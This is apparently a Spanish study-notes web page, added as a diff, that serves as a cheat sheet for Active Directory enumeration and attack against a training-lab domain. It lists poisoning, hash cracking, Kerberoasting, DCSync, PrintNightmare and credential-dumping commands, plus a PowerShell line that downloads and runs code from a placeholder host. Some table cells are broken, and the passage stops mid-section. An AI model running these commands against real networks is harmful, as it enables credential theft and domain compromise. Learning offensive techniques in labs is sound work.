@@ -1,0 +1,490 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Apuntes
+</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Enumeracion y ataques AD </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h1 id="️-guía-de-enumeración-y-ataques-en-active-directory">🛡️ Guía de Enumeración y Ataques en Active Directory</h1>
+<p>Este documento es una <strong>cheat sheet traducida y mejorada</strong> para la enumeración y explotación de Active Directory.<br>
+Incluye comandos desde <strong>Linux y Windows</strong>, con explicaciones claras y estructuradas por categoría.</p>
+<hr>
+<h2 id="-1-enumeración-inicial">📌 1. Enumeración Inicial</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Consulta DNS para descubrir el mapeo de IP ↔ nombre de dominio.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Captura paquetes en la interfaz de red especificada.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Responde y analiza consultas LLMNR, NBT-NS y MDNS en modo pasivo.</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Barrido de ping sobre el segmento de red.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Escaneo Nmap con detección de SO, versión, scripts y traceroute. Resultados guardados en archivo.</td></tr></tbody></table>
+<hr>
+<h2 id="-2-kerbrute-enumeración-de-usuarios">🔑 2. Kerbrute (Enumeración de Usuarios)</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Clona el repositorio de Kerbrute.</td></tr><tr><td><code>make help</code></td><td>Lista opciones de compilación disponibles.</td></tr><tr><td><code>sudo make all</code></td><td>Compila binarios para múltiples SO y arquitecturas.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Prueba el binario compilado.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Mueve el binario a una ruta accesible en el sistema.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Descubre usuarios del dominio usando una wordlist y exporta los resultados.</td></tr></tbody></table>
+<hr>
+<h2 id="️-3-llmnrntb-ns-poisoning">🕵️ 3. LLMNR/NTB-NS Poisoning</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Muestra ayuda y opciones disponibles en Responder.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Crackea hashes NTLMv2 capturados por Responder con Hashcat.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Importa el módulo Inveigh en PowerShell.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Muestra parámetros y funcionalidades de Inveigh.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Inicia Inveigh con spoofing LLMNR &#x26; NBNS, salida en consola y archivo.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Ejecuta la versión en C# de Inveigh.</td></tr></tbody></table>
+<p>| Deshabilita NBT-NS en Windows. |</p>
+<hr>
+<h2 id="-4-password-spraying--políticas-de-contraseñas">🔐 4. Password Spraying &#x26; Políticas de Contraseñas</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>#!/bin/bash   for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x;done</code></td><td>Enumera</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Enumera política de contraseñas</td></tr><tr><td><code>rpcclient -U "" -N 172.16.5.5</code></td><td>Conexión SMB nula para info de dominio.</td></tr><tr><td><code>rpcclient $> querydominfo</code></td><td>Enumera política de contraseñas.</td></tr><tr><td><code>enum4linux -P 172.16.5.5</code></td><td>Extrae política de contraseñas.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Enumera política y exporta en YAML/JSON.</td></tr><tr><td>`ldapsearch -h 172.16.5.5 -x -b “DC=INLANEFREIGHT,DC=LOCAL” -s sub ”*“</td><td>grep -m 1 -B 10 pwdHistoryLength`</td></tr><tr><td><code>net accounts</code></td><td>Enumera política en Windows.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Importa PowerView.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Extrae política con PowerShell.</td></tr></tbody></table>
+<h2 id="️-5-enumeración-de-controles-de-seguridad">🛡️ 5. Enumeración de Controles de Seguridad</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>Revisa estado de Windows Defender.</td></tr><tr><td>`Get-AppLockerPolicy -Effective</td><td>select -ExpandProperty RuleCollections`</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>Descubre modo de lenguaje en PowerShell.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>Enumera grupos delegados de LAPS.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>Chequea permisos extendidos en LAPS.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>Enumera equipos con LAPS habilitado.</td></tr></tbody></table>
+<hr>
+<h2 id="-6-enumeración-con-credenciales-válidas">🔑 6. Enumeración con Credenciales Válidas</h2>
+<p>Incluye <strong>xfreerdp, crackmapexec, smbmap, rpcclient, impacket, windapsearch, BloodHound</strong>, etc.<br>
+👉 Cada comando permite extraer usuarios, grupos, shares, sesiones activas y políticas.</p>
+<h2 id="-7-kerberoasting">🔥 7. Kerberoasting</h2>
+<p>Incluye:</p>
+<ul>
+<li><code>GetUserSPNs.py</code> (impacket)</li>
+<li><code>hashcat -m 13100</code></li>
+<li><code>setspn.exe</code></li>
+<li><code>Rubeus.exe kerberoast</code></li>
+<li><code>mimikatz kerberos::list /export</code></li>
+</ul>
+<p>👉 Se explica cómo solicitar TGS tickets, exportarlos y crackearlos offline.</p>
+<hr>
+<h2 id="-8-acl-enumeration--tácticas">📂 8. ACL Enumeration &#x26; Tácticas</h2>
+<ul>
+<li><code>Get-DomainObjectACL</code></li>
+<li><code>Convert-NameToSid</code></li>
+<li><code>Set-DomainUserPassword</code></li>
+<li><code>Add-DomainGroupMember</code></li>
+<li><code>Remove-DomainGroupMember</code></li>
+</ul>
+<p>👉 Permite manipular permisos delegados en AD y persistir acceso.</p>
+<hr>
+<h2 id="-9-dcsync">🔄 9. DCSync</h2>
+<ul>
+<li><code>mimikatz # lsadump::dcsync</code></li>
+<li><code>secretsdump.py -just-dc</code></li>
+<li>Variables <code>$sid</code> con PowerView</li>
+</ul>
+<p>👉 Ataques para replicar hashes desde el Domain Controller.</p>
+<hr>
+<h2 id="-10-privileged-access">🏰 10. Privileged Access</h2>
+<p>Incluye técnicas para:</p>
+<ul>
+<li>Enumerar <strong>Remote Desktop Users</strong> y <strong>Remote Management Users</strong>.</li>
+<li><code>evil-winrm</code> para acceso remoto.</li>
+<li><code>PowerUpSQL</code> para enumerar instancias SQL.</li>
+<li><code>mssqlclient.py</code> de Impacket con <code>xp_cmdshell</code>.</li>
+</ul>
+<hr>
+<h2 id="-11-nopac">⚡ 11. NoPac</h2>
+<p>Explotación de <strong>Sam-The-Admin</strong>:</p>
+<ul>
+<li><code>scanner.py</code> para detectar vulnerabilidad.</li>
+<li><code>noPac.py</code> para obtener SYSTEM shell o hacer DCSync.</li>
+</ul>
+<hr>
+<h2 id="️-12-printnightmare">🖨️ 12. PrintNightmare</h2>
+<ul>
+<li>Clonar exploit <code>CVE-2021-1675</code>.</li>
+<li>Usar <code>rpcdump.py</code>.</li>
+<li>Generar payload DLL con <code>msfvenom</code>.</li>
+<li>Ejecutar exploit con <code>CVE-2021-1675.py</code>.</li>
+</ul>
+<hr>
+<h2 id="-13-petitpotam">🪟 13. PetitPotam</h2>
+<ul>
+<li><code>PetitPotam.py</code> para provocar autenticación NTLM.</li>
+<li><code>ntlmrelayx.py</code> para relays a servicios ADCS.</li>
+<li><code>gettgtpkinit.py</code> para tickets TGT con certificados.</li>
+</ul>
+<hr>
+<h2 id="️-14-misconfiguraciones-varias">🛠️ 14. Misconfiguraciones Varias</h2>
+<ul>
+<li><code>adidnsdump</code> para resolver registros DNS.</li>
+<li><code>Get-DomainUser -UACFilter PASSWD_NOTREQD</code> para cuentas sin requerir contraseña.</li>
+<li><code>ls \\domain\SYSVOL\</code> para revisar GPO scripts.</li>
+</ul>
+<hr>
+<h2 id="-15-group-policy-enumeration--ataques">🧩 15. Group Policy Enumeration &#x26; Ataques</h2>
+<ul>
+<li><code>gpp-decrypt</code></li>
+<li><code>crackmapexec -M gpp_autologin</code></li>
+<li><code>Get-DomainGPO</code></li>
+<li><code>Get-GPO -All</code></li>
+</ul>
+<hr>
+<h2 id="-16-asreproasting">🔥 16. ASREPRoasting</h2>
+<ul>
+<li><code>Get-DomainUser -PreauthNotRequired</code></li>
+<li><code>Rubeus.exe asreproast</code></li>
+<li><code>hashcat -m 18200</code></li>
+<li><code>kerbrute userenum -d</code></li>
+</ul>
+<hr>
+<h2 id="-17-trust-relationships">🌐 17. Trust Relationships</h2>
+<ul>
+<li>
+<p><strong>Child → Parent Trusts</strong></p>
+<ul>
+<li><code>Get-ADTrust</code></li>
+<li><code>Get-DomainTrust</code></li>
+<li><code>mimikatz kerberos::golden</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Cross-Forest</strong></p>
+<ul>
+<li><code>Rubeus.exe kerberoast /domain</code></li>
+<li><code>GetUserSPNs.py -request -target-domain</code></li>
+<li><code>bloodhound-python</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="-18-transferencia-de-archivos">📦 18. Transferencia de Archivos</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Levanta servidor HTTP en Linux.</td></tr><tr><td><code>IEX(New-Object Net.WebClient).downloadString('http://IP/SharpHound.exe')</code></td><td>Descarga archivo con PowerShell.</td></tr><tr><td><code>impacket-smbserver -ip ...</code></td><td>Monta servidor SMB con Impacket.</td></tr></tbody></table>
+<h2 id="️-enumeración-de-active-directory-con-ldeep">🛡️ Enumeración de Active Directory con <em>ldeep</em></h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">git</span><span style="color:#F1FA8C"> clone</span><span style="color:#F1FA8C"> https://github.com/franc-pentest/ldeep.git</span></span>
+<span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> ldeep</span></span>
+<span class="line"><span style="color:#50FA7B">chmod</span><span style="color:#F1FA8C"> +x</span><span style="color:#F1FA8C"> ldeep.sh</span></span>
+<span class="line"><span style="color:#50FA7B">./ldeep.sh</span></span></code></pre>
+<p>(En Kali viene preinstalado).</p>
+<p>🕵️ Enumeración y Explotación
+Cada módulo de ldeep permite consultar información distinta vía LDAP:</p>
+<p>🔹 Enumerar Computer Objects</p>
+<p>Lista todas las cuentas de computadoras en el dominio.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> computers</span></span></code></pre>
+<p>🔹 Enumerar AD metadata</p>
+<p>Muestra la partición de configuración de AD.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> conf</span></span></code></pre>
+<p>🔹 Enumerar Delegations</p>
+<p>Detecta configuraciones inseguras de delegación.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> delegations</span></span></code></pre>
+<p>🔹 Enumerar Domain Policy</p>
+<p>Revela configuraciones críticas de contraseñas y bloqueos.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> domain_policy</span></span></code></pre>
+<p>🔹 Enumerar FSMO Roles</p>
+<p>Identifica qué DCs tienen roles FSMO.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> fsmo</span></span></code></pre>
+<p>🔹 Enumerar gMSA credentials</p>
+<p>Obtiene credenciales de cuentas de servicio gestionadas.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> gmsa</span></span></code></pre>
+<p>🔹 Enumerar GPOs</p>
+<p>Lista objetos de políticas de grupo.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> gpo</span></span></code></pre>
+<p>🔹 Enumerar Groups</p>
+<p>Muestra grupos importantes como Domain Admins.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> groups</span></span></code></pre>
+<p>🔹 Enumerar Machine Accounts</p>
+<p>Enumera cuentas de equipos.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> machines</span></span></code></pre>
+<p>🔹 Enumerar OUs</p>
+<p>Muestra unidades organizacionales.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> ou</span></span></code></pre>
+<p>🔹 Enumerar Certificate Services</p>
+<p>Enumera ADCS para detectar abuso de plantillas inseguras.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> pkis</span></span></code></pre>
+<p>🔹 Enumerar Schema</p>
+<p>Muestra atributos del esquema de AD.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> schema</span></span></code></pre>
+<p>🔹 Enumerar Certificate Templates</p>
+<p>Lista plantillas de certificados (ESC1–ESC8).</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> templates</span></span></code></pre>
+<p>🔹 Enumerar Users</p>
+<p>Lista todos los usuarios del dominio.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span></span></code></pre>
+<p>🔹 Enumerar Kerberos pre-authentication</p>
+<p>Detecta usuarios con preautenticación deshabilitada.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span><span style="color:#F1FA8C"> nokrbpreauth</span></span></code></pre>
+<p>🔹 Enumerar SPNs</p>
+<p>Muestra usuarios con SPNs asignados.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span><span style="color:#F1FA8C"> spn</span><span style="color:#BD93F9"> -v</span></span></code></pre>
+<p>🔹 Enumerar LAPS</p>
+<p>Obtiene contraseñas LAPS almacenadas en AD.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> laps</span></span></code></pre>
+<p>🔹 Enumerar Memberships</p>
+<p>Muestra todos los grupos a los que pertenece un usuario.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> memberships</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -r</span></span></code></pre>
+<p>🔹 Enumerar User Attributes</p>
+<p>Muestra atributos sensibles (ej: userPassword).</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> search</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">(samaccountname=raj)</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C"> userPassword</span></span></code></pre>
+<p>🔹 Enumerar Identity</p>
+<p>Confirma identidad y credenciales usadas.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> whoami</span></span></code></pre>
+<p>🔓 Explotación</p>
+<p>⚡ Exploitation/Privilege Escalation</p>
+<p>Agregar un usuario a Domain Admins:</p>
